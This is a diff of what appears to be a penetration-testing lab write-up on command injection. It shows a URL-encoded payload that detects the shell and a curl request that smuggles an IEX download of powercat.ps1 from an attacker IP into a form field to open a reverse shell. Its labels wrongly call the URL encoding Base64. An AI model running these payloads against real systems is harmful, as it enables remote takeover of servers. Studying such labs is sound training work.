@@ -1411,8 +1411,8 @@ Ethernet adapter Ethernet0 2:
 See 'git help git' for an overview of the system.
 PowerShell
 ```
-> (Base64 decode) git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell 
-> git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+> (Base64 decode) git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell \
+> **git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell**
 
 #### 2. use **Powercat** to create a reverse shel
 ```
@@ -1426,7 +1426,7 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/power
 └─$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
 ```
 > (Base64 decode) git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell\
-> git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
+> **git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell**
 ```
 ┌──(chw㉿CHW-kali)-[/]
 └─$ python3 -m http.server 80
